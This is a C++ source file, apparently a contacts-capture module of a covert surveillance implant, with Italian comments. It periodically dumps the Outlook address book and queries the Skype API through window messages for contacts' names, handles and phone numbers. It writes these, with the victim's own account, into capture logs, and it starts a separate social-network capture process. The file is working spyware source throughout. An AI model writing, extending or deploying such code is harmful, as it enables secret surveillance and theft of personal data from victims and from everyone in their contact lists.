#include "HM_ContactAgent/OLABMAPI.h"
extern void StartSocialCapture(); // Per far partire le opzioni "social"

#define CONTACTS_SLEEP_TIME (1000*60*60*3) //millisecondi  (ogni 3 ore)

// Globals
BOOL g_bContactsForceExit = FALSE;	// Semaforo per l'uscita del thread (e da tutti i clicli nelle funzioni chiamate)
//BOOL bPM_ContactsStarted = FALSE;	// Indica se l'agente e' attivo o meno
HANDLE hContactsThread = NULL;		// Thread di cattura
DWORD g_contact_delay = 0;			// Il delay deve essere assoluto (non deve ricominciare ad ogni sync)

BOOL bPM_cnspmcp = FALSE; // Semaforo per l'uscita del thread
HANDLE hCnSkypePMThread = NULL;

typedef struct _ContactHeader{
        DWORD           dwSize;
        DWORD           dwVersion;
        LONG            lOid;
		DWORD			program;
		DWORD			flags;
} ContactHeaderStruct, *pContactHeaderStruct;

DWORD CalcEntryLen(WCHAR *string)
{
	DWORD lens;
	if (!string) 
		return 0;
		
	lens = wcslen(string);
	if (lens > 0)
		return (lens*sizeof(WCHAR) + sizeof(DWORD));
	
	return 0;
}

#define ADD_CONTACT_STRING(x,y) 	if (x && wcslen(x)>0) {\
	                                  DWORD tlen; \
		                              tlen = wcslen(x)*sizeof(WCHAR); \
		                              tlen |= (y<<24); \
		                              tolog.add(&tlen, sizeof(DWORD)); \
									  tolog.add(x, wcslen(x)*sizeof(WCHAR));}

BOOL DumpContact(HANDLE hfile, DWORD program, WCHAR *name, WCHAR *email, WCHAR *company, WCHAR *addr_home, WCHAR *addr_office, WCHAR *phone_off, WCHAR *phone_mob, WCHAR *phone_hom, WCHAR *screen_name, WCHAR *facebook_page, DWORD flags)
{
	bin_buf tolog;
	ContactHeaderStruct contact_header;

	contact_header.dwVersion = 0x01000001;
	contact_header.lOid = 0;
	contact_header.dwSize = sizeof(contact_header);
	contact_header.dwSize += CalcEntryLen(name);
	contact_header.dwSize += CalcEntryLen(email);
	contact_header.dwSize += CalcEntryLen(company);
	contact_header.dwSize += CalcEntryLen(addr_home);
	contact_header.dwSize += CalcEntryLen(addr_office);
	contact_header.dwSize += CalcEntryLen(phone_off);
	contact_header.dwSize += CalcEntryLen(phone_mob);
	contact_header.dwSize += CalcEntryLen(phone_hom);
	contact_header.dwSize += CalcEntryLen(screen_name);
	contact_header.dwSize += CalcEntryLen(facebook_page);
	contact_header.program = program;
	contact_header.flags = flags;

	tolog.add(&contact_header, sizeof(contact_header));
	ADD_CONTACT_STRING(name, 0x1);
	ADD_CONTACT_STRING(email, 0x6);
	ADD_CONTACT_STRING(company, 0x3);
	ADD_CONTACT_STRING(addr_home, 0x21);
	ADD_CONTACT_STRING(addr_office, 0x2A);
	ADD_CONTACT_STRING(phone_off, 0xA);
	ADD_CONTACT_STRING(phone_mob, 0x7);
	ADD_CONTACT_STRING(phone_hom, 0xC);
	ADD_CONTACT_STRING(screen_name, 0x40);
	ADD_CONTACT_STRING(facebook_page, 0x40);

	Log_WriteFile(hfile, tolog.get_buf(), tolog.get_len());

	return TRUE;
}

DWORD WINAPI CaptureContactsThread(DWORD dummy)
{
	LOOP {
		// Se e' appena partito prende subito i contatti
		if (g_contact_delay == 0)
			OL_DumpAddressBook();

		// Sleepa 
		while (g_contact_delay < CONTACTS_SLEEP_TIME) {
			Sleep(200);
			g_contact_delay += 200;
			CANCELLATION_POINT(g_bContactsForceExit);
		}
		g_contact_delay = 0;
	}
}

void SendRequestContacts(HWND skype_api_wnd, HWND skype_pm_wnd)
{
	char req_buf[256];
	COPYDATASTRUCT cd_struct;
	DWORD dummy;

	sprintf(req_buf, "GET AUTH_CONTACTS_PROFILES");
	cd_struct.dwData = 0;
	cd_struct.lpData = req_buf;
	cd_struct.cbData = strlen((char *)cd_struct.lpData)+1;
	HM_SafeSendMessageTimeoutW(skype_api_wnd, WM_COPYDATA, (WPARAM)skype_pm_wnd, (LPARAM)&cd_struct, SMTO_NORMAL, 0, &dummy);
}

DWORD __stdcall PM_ContactsDispatch(BYTE *msg, DWORD dwLen, DWORD dwFlags, FILETIME *time_nanosec)
{
	WCHAR user_handle[256];
	WCHAR user_name[256];
	WCHAR phone_hom[64];
	WCHAR phone_off[64];
	WCHAR phone_mob[64];
	WCHAR *wptr;
	char *ptr;
	HANDLE hfile;

	// Se il monitor e' stoppato non esegue la funzione di dispatch
	if (!bPM_ContactsStarted)
		return 0;

	// Parsa il messaggio di skype con tutti i contatti
	if (dwFlags & FLAGS_SKAPI_MSG) {
		NullTerminatePacket(dwLen, msg);

		// Parsa il messaggio con il nome del proprio account
		if (!strncmp((char *)msg, "CURRENTUSERHANDLE ", strlen("CURRENTUSERHANDLE "))) {
			msg += strlen("CURRENTUSERHANDLE ");
			hfile = Log_CreateFile(PM_CONTACTSAGENT, NULL, 0);
			_snwprintf_s(user_handle, sizeof(user_handle)/sizeof(WCHAR), _TRUNCATE, L"%S", msg);		
			DumpContact(hfile, CONTACT_SRC_SKYPE, user_handle, NULL, NULL, NULL, NULL, NULL, NULL, NULL, user_handle, NULL, CONTACTS_MYACCOUNT);
			Log_CloseFile(hfile);
			return 1;
		}

		if (strncmp((char *)msg, "AUTH_CONTACTS_PROFILES ", strlen("AUTH_CONTACTS_PROFILES ")))
			return 1;
		msg += strlen("AUTH_CONTACTS_PROFILES");

		ZeroMemory(user_handle, sizeof(user_handle));
		ZeroMemory(user_name, sizeof(user_name));
		ZeroMemory(phone_hom, sizeof(phone_hom));
		ZeroMemory(phone_off, sizeof(phone_off));
		ZeroMemory(phone_mob, sizeof(phone_mob));

		hfile = Log_CreateFile(PM_CONTACTSAGENT, NULL, 0);
		// I contatti sono separati da ',' e i valori da ';'
		do {
			msg++;
			_snwprintf_s(user_handle, sizeof(user_handle)/sizeof(WCHAR), _TRUNCATE, L"%S", msg);		
			wptr = wcschr(user_handle, L';');
			if (wptr)
				*wptr = 0;
			if (!(ptr = strchr((char *)msg, ';')))
				break;
			ptr++;
			_snwprintf_s(user_name, sizeof(user_name)/sizeof(WCHAR), _TRUNCATE, L"%S", ptr);		
			wptr = wcschr(user_name, L';');
			if (wptr)
				*wptr = 0;
			if (!(ptr = strchr(ptr, ';')))
				break;
			ptr++;
			_snwprintf_s(phone_hom, sizeof(phone_hom)/sizeof(WCHAR), _TRUNCATE, L"%S", ptr);		
			wptr = wcschr(phone_hom, L';');
			if (wptr)
				*wptr = 0;
			if (!(ptr = strchr(ptr, ';')))
				break;
			ptr++;
			_snwprintf_s(phone_off, sizeof(phone_off)/sizeof(WCHAR), _TRUNCATE, L"%S", ptr);		
			wptr = wcschr(phone_off, L';');
			if (wptr)
				*wptr = 0;
			if (!(ptr = strchr(ptr, ';')))
				break;
			ptr++;
			_snwprintf_s(phone_mob, sizeof(phone_mob)/sizeof(WCHAR), _TRUNCATE, L"%S", ptr);		
			wptr = wcschr(phone_mob, L';');
			if (wptr)
				*wptr = 0;

			DumpContact(hfile, CONTACT_SRC_SKYPE, user_name, NULL, NULL, NULL, NULL, phone_off, phone_mob, phone_hom, user_handle, NULL, 0);

		} while(msg = (BYTE *)strchr((char *)msg, ','));
		Log_CloseFile(hfile);

		return 1;
	} else if (dwFlags & FLAGS_SKAPI_WND) {
		skype_api_wnd = *((HWND *)msg);
		if (skype_api_wnd && skype_pm_wnd)
			SendRequestContacts(skype_api_wnd, skype_pm_wnd);
		return 1;
	} else if (dwFlags & FLAGS_SKAPI_SWD) {
		skype_pm_wnd = *((HWND *)msg);
		if (skype_api_wnd && skype_pm_wnd)
			SendRequestContacts(skype_api_wnd, skype_pm_wnd);
		return 1;
	}
}


DWORD __stdcall PM_ContactsStartStop(BOOL bStartFlag, BOOL bReset)
{	
	DWORD dummy;

	if (bReset)
		AM_IPCAgentStartStop(PM_CONTACTSAGENT, bStartFlag);

	// Se l'agent e' gia' nella condizione desiderata
	// non fa nulla.
	if (bPM_ContactsStarted == bStartFlag)
		return 0;

	bPM_ContactsStarted = bStartFlag;

	if (bStartFlag) {
		// Se e' stato startato esplicitamente, ricomincia catturando
		if (bReset)
			g_contact_delay = 0;

		// Crea il thread che cattura i contatti
		hContactsThread = HM_SafeCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)CaptureContactsThread, NULL, 0, &dummy);
		hCnSkypePMThread = HM_SafeCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)MonitorSkypePM, (DWORD *)&bPM_cnspmcp, 0, 0);

		// Fa partire il processo per la cattura dei dati socia.
		// Se inserisco una opzione per abilitare o meno la cattura dei social,
		// questa funzione va chiamata solo se l'opzione e' attiva.
		StartSocialCapture();
	} else {
		QUERY_CANCELLATION(hContactsThread, g_bContactsForceExit);
		QUERY_CANCELLATION(hCnSkypePMThread, bPM_cnspmcp);

	}

	return 1;
}


DWORD __stdcall PM_ContactsInit(JSONObject elem)
{
	return 1;
}


void PM_ContactsRegister()
{
	bPM_ContactsStarted = FALSE;
	AM_MonitorRegister(L"addressbook", PM_CONTACTSAGENT, (BYTE *)PM_ContactsDispatch, (BYTE *)PM_ContactsStartStop, (BYTE *)PM_ContactsInit, NULL);
}